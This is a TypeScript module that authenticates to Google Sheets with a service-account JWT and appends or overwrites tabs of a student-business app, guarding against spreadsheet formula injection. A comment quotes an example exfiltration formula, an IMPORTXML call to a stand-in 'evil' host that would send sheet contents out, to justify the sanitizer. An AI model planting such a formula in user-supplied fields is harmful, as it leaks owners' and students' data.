/* Google Sheets writer — service-account auth, no SDK dependency.

   PRIVACY CONTRACT — read before adding a caller.

   Aggregate business figures may always be written. Per-student rows are
   limited to the owner's own operational record — the Complaints tab, and the
   live Orders log — and carry a NAME and CUSTOMER ID only. Never a phone
   number, never an address. A Sheet is one careless click from being shared,
   and the smallest thing that identifies a student to a stranger is their
   number.

   The owner asked for a live per-order log, so this is a deliberate widening
   of the original "aggregates only" rule, not an oversight. /privacy names
   Google as a processor and states exactly which fields are written — keep
   the two in step if you add a column here.

   Env (all required; the sync is a no-op without them):
     GOOGLE_SA_EMAIL        service account address (…@….iam.gserviceaccount.com)
     GOOGLE_SA_PRIVATE_KEY  its PEM private key ("\n" escapes are unescaped here)
     GOOGLE_SHEET_ID        the id from the sheet URL /d/<THIS>/edit          */
import crypto from "node:crypto";

const TOKEN_URL = "https://oauth2.googleapis.com/token";
const SCOPE = "https://www.googleapis.com/auth/spreadsheets";

export function sheetsConfigured() {
  return !!(process.env.GOOGLE_SA_EMAIL && process.env.GOOGLE_SA_PRIVATE_KEY && process.env.GOOGLE_SHEET_ID);
}

function b64url(input: string | Buffer) {
  return Buffer.from(input).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

/** Mint a short-lived access token from the service-account key (RS256 JWT). */
async function accessToken(): Promise<string> {
  const email = process.env.GOOGLE_SA_EMAIL!;
  // Vercel env vars can't hold real newlines, so the key is stored with \n escapes.
  const key = process.env.GOOGLE_SA_PRIVATE_KEY!.replace(/\\n/g, "\n");

  const now = Math.floor(Date.now() / 1000);
  const header = b64url(JSON.stringify({ alg: "RS256", typ: "JWT" }));
  const claim = b64url(JSON.stringify({
    iss: email, scope: SCOPE, aud: TOKEN_URL, iat: now, exp: now + 3600,
  }));
  const signature = b64url(crypto.createSign("RSA-SHA256").update(`${header}.${claim}`).sign(key));
  const assertion = `${header}.${claim}.${signature}`;

  const res = await fetch(TOKEN_URL, {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer", assertion }),
  });
  if (!res.ok) throw new Error(`Google auth failed (${res.status}): ${(await res.text()).slice(0, 200)}`);
  return ((await res.json()) as { access_token: string }).access_token;
}

/* Every write uses USER_ENTERED so numbers and dates keep working, which also
   means a text cell starting with = + - or @ is EXECUTED as a formula. Names,
   complaint text and expense notes are typed by other people (a BVRIT student
   types their own name at self-registration), so a value like
   =IMPORTXML("http://evil/?"&A1:F50,"//a") would read the owner's data and send it
   out when the Sheet is opened. A leading apostrophe makes Sheets treat the cell
   as plain text (and hides the apostrophe). Plain numbers-as-text ("-5", "+12")
   and cells already prefixed with an apostrophe are left alone. */
export function sheetSafe<T>(cell: T): T | string {
  if (typeof cell !== "string" || cell === "") return cell;
  if (!/^[=+\-@\t\r]/.test(cell)) return cell;
  if (/^[+-]?\d+(\.\d+)?$/.test(cell)) return cell;
  return "'" + cell;
}
const safeRows = (rows: (string | number)[][]) => rows.map((r) => r.map((c) => sheetSafe(c)));

/** Read a tab's values. Returns [] when the tab doesn't exist yet. */
export async function readSheet(tab: string): Promise<string[][]> {
  if (!sheetsConfigured()) return [];
  const id = process.env.GOOGLE_SHEET_ID!;
  const token = await accessToken();
  const range = encodeURIComponent(`${tab}!A1:F200`);
  const res = await fetch(`https://sheets.googleapis.com/v4/spreadsheets/${id}/values/${range}`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) return []; // missing tab -> 400; treat as empty
  const j = (await res.json()) as { values?: string[][] };
  return j.values || [];
}

/**
 * APPEND rows to the bottom of a tab, creating the tab and writing `header`
 * first if it is empty.
 *
 * Appending rather than rewriting is what makes a live log affordable. The
 * aggregate sync clears and re-writes whole tabs, which costs several API
 * calls and grows with the dataset — fine once a day, ruinous per order. An
 * append is one call whatever the history.
 *
 * Returns a result rather than throwing: a Sheets outage must never be able to
 * take an order down with it.
 */
export async function appendSheet(
  tab: string,
  rows: (string | number)[][],
  header?: (string | number)[],
) {
  if (!sheetsConfigured()) return { ok: false as const, error: "Google Sheets not configured" };
  if (!rows.length) return { ok: true as const, rows: 0 };

  const id = process.env.GOOGLE_SHEET_ID!;
  try {
    const token = await accessToken();
    const auth = { Authorization: `Bearer ${token}`, "Content-Type": "application/json" };

    // Create the tab if absent. "already exists" is the normal case — ignore it.
    await fetch(`https://sheets.googleapis.com/v4/spreadsheets/${id}:batchUpdate`, {
      method: "POST", headers: auth,
      body: JSON.stringify({ requests: [{ addSheet: { properties: { title: tab } } }] }),
    }).catch(() => {});

    /* Header only when the tab is genuinely empty. Checking A1 rather than
       tracking "did I create it" keeps this correct if the tab was made by
       hand, and stops a header being appended into the middle of the log. */
    const out = safeRows([...rows]);
    if (header) {
      const first = await fetch(
        `https://sheets.googleapis.com/v4/spreadsheets/${id}/values/${encodeURIComponent(`${tab}!A1:A1`)}`,
        { headers: { Authorization: `Bearer ${token}` } },
      );
      const empty = !first.ok || !((await first.json()) as { values?: string[][] }).values?.length;
      if (empty) out.unshift(safeRows([header])[0]);
    }

    const range = encodeURIComponent(`${tab}!A1`);
    const res = await fetch(
      `https://sheets.googleapis.com/v4/spreadsheets/${id}/values/${range}:append` +
        `?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS`,
      { method: "POST", headers: auth, body: JSON.stringify({ values: out }) },
    );
    if (!res.ok) return { ok: false as const, error: `append failed (${res.status}): ${(await res.text()).slice(0, 200)}` };
    return { ok: true as const, rows: out.length };
  } catch (e) {
    return { ok: false as const, error: (e as Error).message };
  }
}

/** Overwrite a tab with `rows` (row 0 = headers). Creates the tab if missing. */
export async function writeSheet(tab: string, rows: (string | number)[][]) {
  if (!sheetsConfigured()) return { ok: false as const, error: "Google Sheets not configured" };
  const id = process.env.GOOGLE_SHEET_ID!;
  const token = await accessToken();
  const auth = { Authorization: `Bearer ${token}`, "Content-Type": "application/json" };

  // Create the tab if it doesn't exist yet (ignore "already exists").
  await fetch(`https://sheets.googleapis.com/v4/spreadsheets/${id}:batchUpdate`, {
    method: "POST",
    headers: auth,
    body: JSON.stringify({ requests: [{ addSheet: { properties: { title: tab } } }] }),
  }).catch(() => {});

  /* Write the new data FIRST, then clear only what's left over — not
     clear-then-write. This tab is the Owner's live operational view (Live,
     Students, Plans, ...), read at any moment, not just right after a sync.
     Clear-then-write has a real window where the tab is genuinely EMPTY: if
     the process dies, times out, or Google's API hiccups between the clear
     succeeding and the write landing (any one of the many syncs this
     function serves, several times a day), the Owner opens a blank tab with
     nothing to show until the next sync succeeds — for the hourly aggregate
     sync, up to an hour of "the Sheet is broken". Writing first means a
     failure at worst leaves stale-but-present data (self-correcting on the
     next successful sync) rather than a black hole. */
  /* Pad every row to the full A:Z width. A PUT leaves any cell the payload
     doesn't mention untouched, so an empty spacer row or a shorter row would
     keep whatever the PREVIOUS sync left there (found live: a deleted
     student's row surviving in the "Students — BVRIT" tab under the new
     "Total 0" line). Explicit "" values overwrite it. */
  const padded = safeRows(rows).map((r) => { const a: (string | number)[] = r.slice(0, 26); while (a.length < 26) a.push(""); return a; });
  const dataRange = encodeURIComponent(`${tab}!A1:Z${Math.max(rows.length, 1)}`);
  const put = await fetch(
    `https://sheets.googleapis.com/v4/spreadsheets/${id}/values/${dataRange}?valueInputOption=USER_ENTERED`,
    { method: "PUT", headers: auth, body: JSON.stringify({ values: padded }) },
  );
  if (!put.ok) return { ok: false as const, error: `write failed (${put.status}): ${(await put.text()).slice(0, 200)}` };

  // Trim any rows a SHRINKING dataset left behind, below the data just
  // written. A failure here leaves harmless stale trailing rows, not a
  // blank tab — the asymmetry is the whole point of this ordering.
  const trimRange = encodeURIComponent(`${tab}!A${rows.length + 1}:Z1000`);
  const clear = await fetch(`https://sheets.googleapis.com/v4/spreadsheets/${id}/values/${trimRange}:clear`, {
    method: "POST", headers: auth, body: "{}",
  });
  if (!clear.ok) return { ok: false as const, error: `trim failed (${clear.status}): ${(await clear.text()).slice(0, 200)}` };

  return { ok: true as const, rows: rows.length };
}
